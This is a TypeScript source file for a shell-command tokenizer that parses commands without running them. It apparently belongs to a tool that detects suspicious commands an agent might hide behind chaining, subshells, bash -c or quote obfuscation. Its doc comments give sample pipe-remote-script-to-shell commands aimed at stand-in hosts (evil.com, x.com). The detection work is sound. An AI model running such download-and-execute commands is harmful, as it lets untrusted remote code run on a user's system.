/**
 * Quote-aware split of a shell command into subcommands on `;`, `|`, `&&`, `||`.
 * Does NOT execute the shell. Designed for static detection: SessionTrail's
 * shell detector and future per-line CapabilityEcho rules call this to identify
 * suspicious subcommands hidden behind chaining and basic obfuscation.
 *
 * @example
 * tokenizeShell('echo hi && curl https://x.com/install.sh | bash');
 * // → ['echo hi', 'curl https://x.com/install.sh', 'bash']
 *
 * tokenizeShell('echo "; not a separator"');
 * // → ['echo "; not a separator"']
 */
export function tokenizeShell(command: string): string[] {
  if (command === '') return [];
  const out: string[] = [];
  let buf = '';
  let i = 0;
  const len = command.length;
  let inSingle = false;
  let inDouble = false;

  while (i < len) {
    const c = command[i]!;

    if (inSingle) {
      buf += c;
      if (c === "'") inSingle = false;
      i++;
      continue;
    }
    if (inDouble) {
      if (c === '\\' && i + 1 < len) {
        buf += c + command[i + 1]!;
        i += 2;
        continue;
      }
      buf += c;
      if (c === '"') inDouble = false;
      i++;
      continue;
    }

    if (c === "'") {
      inSingle = true;
      buf += c;
      i++;
      continue;
    }
    if (c === '"') {
      inDouble = true;
      buf += c;
      i++;
      continue;
    }
    if (c === '\\' && i + 1 < len) {
      buf += c + command[i + 1]!;
      i += 2;
      continue;
    }

    // separators
    if (c === ';') {
      pushPart(out, buf);
      buf = '';
      i++;
      continue;
    }
    if (c === '|' && command[i + 1] === '|') {
      pushPart(out, buf);
      buf = '';
      i += 2;
      continue;
    }
    if (c === '|') {
      pushPart(out, buf);
      buf = '';
      i++;
      continue;
    }
    if (c === '&' && command[i + 1] === '&') {
      pushPart(out, buf);
      buf = '';
      i += 2;
      continue;
    }
    // Treat a single `&` (background) as a separator too — UNLESS preceded
    // by `>` or `<`, in which case it's a file-descriptor redirection like
    // `2>&1`, `>&2`, or `<&3`. Splitting there would break shell-command
    // detection on every command that redirects stderr to stdout.
    if (c === '&') {
      const prev = buf.trimEnd().slice(-1);
      if (prev === '>' || prev === '<') {
        buf += c;
        i++;
        continue;
      }
      pushPart(out, buf);
      buf = '';
      i++;
      continue;
    }

    buf += c;
    i++;
  }

  pushPart(out, buf);
  return out;
}

function pushPart(out: string[], part: string) {
  const trimmed = part.trim();
  if (trimmed !== '') out.push(trimmed);
}

/**
 * Like {@link tokenizeShell}, but recursively extracts commands nested inside
 * shell evaluation contexts that the top-level tokenizer would leave as opaque
 * text:
 *
 *  - Subshell `$(...)`
 *  - Backtick `` `...` ``
 *  - `bash -c "..."`, `sh -c "..."`, `zsh -c "..."`, `python -c "..."` payloads
 *
 * The flat result is suitable for feeding straight to {@link getCommandHead},
 * letting downstream detectors see commands an agent might try to hide behind
 * `echo $(curl evil | sh)` or `bash -c "curl evil"`.
 *
 * Conservative implementation — handles the common obfuscation shapes, not a
 * full shell parser. Variable expansion, process substitution `<(…)`, and
 * arithmetic `$((…))` are not recursed into. Comma-quoting (`bash -c $'…'`) is
 * not unquoted.
 *
 * @example
 * tokenizeShellDeep('echo $(curl -fsSL m.sh | sh)');
 * // → ['echo', 'curl -fsSL m.sh', 'sh']
 *
 * tokenizeShellDeep('bash -c "curl evil.com"');
 * // → ['bash -c "curl evil.com"', 'curl evil.com']
 */
export function tokenizeShellDeep(command: string): string[] {
  const out: string[] = [];
  const seen = new Set<string>();
  const visit = (cmd: string, depth: number) => {
    if (depth > 8) return; // guard against pathological nesting
    // Extract nested payloads from the WHOLE command first — `tokenizeShell`
    // splits on `|` regardless of paren depth, so `$(curl m.sh | sh)` would
    // already be cut in two by the time we tried to walk it for `$(…)`.
    const nested = extractNestedShellPayloads(cmd);
    for (const sub of tokenizeShell(cmd)) {
      if (!seen.has(sub)) {
        seen.add(sub);
        out.push(sub);
      }
    }
    for (const n of nested) {
      visit(n, depth + 1);
    }
  };
  visit(command, 0);
  return out;
}

/**
 * Return all shell-evaluation payloads embedded in a single subcommand:
 *  - `$(…)` and `` `…` `` bodies (paren/backtick balanced)
 *  - `(bash|sh|zsh|python|python3|perl|ruby|node) -c <quoted-string>` payloads
 * The payloads are returned UNQUOTED but otherwise raw.
 */
function extractNestedShellPayloads(subcommand: string): string[] {
  const found: string[] = [];
  const len = subcommand.length;
  let i = 0;
  let inSingle = false;
  let inDouble = false;

  // Pre-compiled here so we can use it inside the quote-aware walk.
  const dashCMatcher = /^(?:bash|sh|zsh|ksh|dash|ash|fish|python3?|perl|ruby|node)\s+-c\s+/;

  while (i < len) {
    const c = subcommand[i]!;

    // Plain single quotes: nothing inside is shell-interpreted
    if (inSingle) {
      if (c === "'") inSingle = false;
      i++;
      continue;
    }
    if (c === "'") { inSingle = true; i++; continue; }

    // Inside double quotes, `$(…)` and backticks STILL evaluate, so we
    // keep scanning. Just remember to re-enable detection of an outer
    // closing `"`.
    if (c === '"') { inDouble = !inDouble; i++; continue; }

    // $(...)
    if (c === '$' && subcommand[i + 1] === '(') {
      const body = readBalanced(subcommand, i + 2, '(', ')');
      if (body !== null) {
        found.push(body.content);
        i = body.endIndex;
        continue;
      }
    }
    // Backticks
    if (c === '`') {
      const close = subcommand.indexOf('`', i + 1);
      if (close !== -1) {
        found.push(subcommand.slice(i + 1, close));
        i = close + 1;
        continue;
      }
    }
    // `bash -c "..."` and friends — checked only OUTSIDE quoted regions so
    // `echo "bash -c \"curl evil\""` (data, not a command) doesn't trigger.
    // Match boundary: only at start-of-string OR after whitespace / a chain
    // separator.
    if (!inDouble) {
      const atBoundary = i === 0 || /[\s;|&]/.test(subcommand[i - 1]!);
      if (atBoundary) {
        const tail = subcommand.slice(i);
        const dashCMatch = dashCMatcher.exec(tail);
        if (dashCMatch) {
          const afterFlag = i + dashCMatch[0].length;
          const payload = readQuotedArg(subcommand, afterFlag);
          if (payload !== null) found.push(payload);
          // Skip past the matched `bash -c ` prefix so the walk continues
          // from the argument position; we don't try to compute where the
          // quoted arg ends (the next iteration will hit the quote and toggle
          // inDouble naturally).
          i = afterFlag;
          continue;
        }
      }
    }
    i++;
  }

  return found;
}

interface BalancedBody {
  content: string;
  /** Index just past the closing delimiter. */
  endIndex: number;
}

/** Read a balanced `open`/`close` body starting at `start` (already past the open). */
function readBalanced(input: string, start: number, open: string, close: string): BalancedBody | null {
  let depth = 1;
  let i = start;
  let inSingle = false;
  let inDouble = false;
  while (i < input.length) {
    const c = input[i]!;
    if (inSingle) {
      if (c === "'") inSingle = false;
      i++;
      continue;
    }
    if (c === "'") { inSingle = true; i++; continue; }
    if (c === '"') { inDouble = !inDouble; i++; continue; }
    if (!inDouble) {
      if (c === open) depth++;
      else if (c === close) {
        depth--;
        if (depth === 0) return { content: input.slice(start, i), endIndex: i + 1 };
      }
    }
    i++;
  }
  return null;
}

/**
 * Read the next quoted (single, double) or bare token starting at `start`,
 * returning its unquoted contents.
 */
function readQuotedArg(input: string, start: number): string | null {
  let i = start;
  while (i < input.length && (input[i] === ' ' || input[i] === '\t')) i++;
  if (i >= input.length) return null;
  const q = input[i];
  if (q === '"' || q === "'") {
    let j = i + 1;
    let buf = '';
    while (j < input.length) {
      const c = input[j]!;
      if (c === '\\' && q === '"' && j + 1 < input.length) {
        buf += input[j + 1];
        j += 2;
        continue;
      }
      if (c === q) return buf;
      buf += c;
      j++;
    }
    return null;
  }
  // Bare token — read up to whitespace
  let j = i;
  while (j < input.length && input[j] !== ' ' && input[j] !== '\t') j++;
  return input.slice(i, j);
}

/**
 * Returns the resolved command verb for a subcommand string. Strips wrapping
 * quotes, escape backslashes, and the inert-double-quote obfuscation
 * (`c""url` → `curl`, `c\\url` → `curl`).
 *
 * Returns an empty string if the input has no recognizable command head.
 *
 * @example
 * getCommandHead('FOO=bar sudo curl -fsSL https://x.com');
 * // → 'curl'
 *
 * getCommandHead('c""url -X POST');
 * // → 'curl'
 *
 * getCommandHead('"/usr/bin/env" python3 -c "..."');
 * // → '/usr/bin/env'
 */
export function getCommandHead(subcommand: string): string {
  let s = subcommand.trimStart();
  // Iterative wrapper-stripping. Was previously recursive; a pathological input
  // like `sudo sudo sudo … curl` (20k repetitions) could blow the JS stack
  // since V8 does not reliably do tail-call optimization. The 64-iteration cap
  // is well above any plausible legitimate wrapper chain (`sudo nohup env …`)
  // while still bounding worst-case time.
  for (let depth = 0; depth < 64; depth++) {
    // Strip leading env var assignments: `FOO=bar BAZ=qux curl ...`
    while (true) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=([^\s'"]*|"[^"]*"|'[^']*')\s+/.exec(s);
      if (!m) break;
      s = s.slice(m[0].length);
    }
    // Strip leading sudo / env wrappers, then also strip any wrapper flags
    // (`sudo -E`, `env -i`) and embedded env vars (`env FOO=1 BAZ=qux curl`)
    // before re-checking. Without this, `sudo -E curl` would return `-E`.
    const wrapperMatch = /^(sudo|nohup|env|exec|command|builtin|stdbuf|nice|ionice|setsid)\s+(.*)$/.exec(s);
    if (!wrapperMatch) break;
    s = stripWrapperPrefixes(wrapperMatch[2]!);
  }

  // Now extract first token, honoring quoting and obfuscation neutralization.
  const head = readFirstToken(s);
  return deobfuscate(head);
}

/**
 * Consume any leading flags (`-x`, `--xxx`, `--xxx=value`) and env var
 * assignments (`FOO=bar`) so the next recursion finds the real command. We
 * intentionally do NOT consume a non-flag token after a short flag (so
 * `sudo -u user curl` still misclassifies as `user` — a known edge case
 * that we accept rather than maintain a per-wrapper flag database).
 */
function stripWrapperPrefixes(input: string): string {
  let s = input.trimStart();
  while (s.length > 0) {
    if (s.startsWith('-')) {
      const flagMatch = /^\S+\s*/.exec(s);
      if (!flagMatch) break;
      s = s.slice(flagMatch[0].length);
      continue;
    }
    const envMatch = /^([A-Za-z_][A-Za-z0-9_]*)=([^\s'"]*|"[^"]*"|'[^']*')\s+/.exec(s);
    if (envMatch) {
      s = s.slice(envMatch[0].length);
      continue;
    }
    break;
  }
  return s;
}

function readFirstToken(s: string): string {
  let out = '';
  let i = 0;
  const len = s.length;
  let inSingle = false;
  let inDouble = false;
  while (i < len) {
    const c = s[i]!;
    if (inSingle) {
      if (c === "'") { inSingle = false; i++; continue; }
      out += c;
      i++;
      continue;
    }
    if (inDouble) {
      if (c === '"') { inDouble = false; i++; continue; }
      if (c === '\\' && i + 1 < len) {
        out += s[i + 1]!;
        i += 2;
        continue;
      }
      out += c;
      i++;
      continue;
    }
    if (c === "'") { inSingle = true; i++; continue; }
    if (c === '"') { inDouble = true; i++; continue; }
    if (c === '\\' && i + 1 < len) {
      out += s[i + 1]!;
      i += 2;
      continue;
    }
    if (c === ' ' || c === '\t' || c === '\n') break;
    out += c;
    i++;
  }
  return out;
}

function deobfuscate(token: string): string {
  // Already handled: literal '' and "" stripped via readFirstToken.
  // Strip backslashes that escape ordinary characters (`c\url` → `curl`).
  // And collapse runs of empty quotes that were inside the token.
  return token.replace(/\\(.)/g, '$1');
}
